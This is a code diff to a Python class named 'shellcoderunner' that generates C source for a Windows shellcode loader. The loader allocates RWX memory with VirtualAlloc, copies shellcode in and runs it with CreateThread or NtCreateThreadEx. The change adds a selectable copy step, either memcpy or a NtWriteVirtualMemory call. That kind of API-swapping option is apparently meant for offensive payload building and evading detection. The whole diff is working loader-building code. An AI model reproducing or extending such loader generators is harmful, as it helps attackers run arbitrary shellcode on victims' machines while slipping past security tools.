@@ -5,10 +5,13 @@ class shellcoderunner:
         self.apicallsList = ['WaitForSingleObject', 'CloseHandle']
         self.allocation = 'VirtualAlloc'
         self.execution = 'CreateThread'
+        self.copy = 'memcpy'
         if 'allocation' in arguments:
             self.allocation = arguments['allocation']
         if 'execution' in arguments:
             self.execution = arguments['execution']
+        if 'copy' in arguments:
+            self.copy = arguments['copy']
         if self.allocation == 'VirtualAlloc':
             self.allocationCode = """
     LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -47,6 +50,17 @@ class shellcoderunner:
     {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL);
 """
             self.apicallsList += ['NtCreateThreadEx']
+        if self.copy == 'memcpy':
+            self.copyCode = """
+    memcpy(buffer, shellcode, {shellcodeSize});
+"""
+        elif self.copy == 'NtWriteVirtualMemory':
+            self.copyCode = """
+    SIZE_T bytesWritten = 0;
+    {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
+"""
+            self.apicallsList += ['NtWriteVirtualMemory']
+
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -69,8 +83,7 @@ class shellcoderunner:
     $allocation
 
     // Copy our shellcode into memory that we just allocated (inside of our current process)
-    memcpy(buffer, shellcode, {shellcodeSize});
-
+    $copy
 
     // Create thread to run shellcode
     $execution
@@ -81,4 +94,4 @@ class shellcoderunner:
 
     // Clean up by freeing the memory we allocated for our shellcode
     $free
-""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode)
+""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, copy=self.copyCode)
